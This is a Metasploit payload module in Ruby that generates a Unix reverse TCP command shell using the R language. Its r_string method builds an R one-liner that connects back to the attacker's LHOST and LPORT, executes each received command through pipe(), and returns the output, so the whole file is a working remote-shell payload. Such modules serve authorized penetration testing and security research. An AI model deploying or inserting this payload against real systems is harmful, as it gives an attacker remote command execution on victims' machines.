##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/r'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 157

  include Msf::Payload::Single
  include Msf::Payload::R
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Reverse TCP (via R)',
      'Description' => 'Connect back and create a command shell via R',
      'Author'      => [ 'RageLtMan <rageltman[at]sempervictus>' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'R',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    return prepends(r_string)
  end

  def prepends(r_string)
   return "R -e \"#{r_string}\""
  end

  def r_string
    lhost = datastore['LHOST']
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    return "s<-socketConnection(host='#{lhost}',port=#{datastore['LPORT']}," +
    "blocking=TRUE,server=FALSE,open='r+');while(TRUE){writeLines(readLines" +
    "(pipe(readLines(s, 1))),s)}"
  end
end
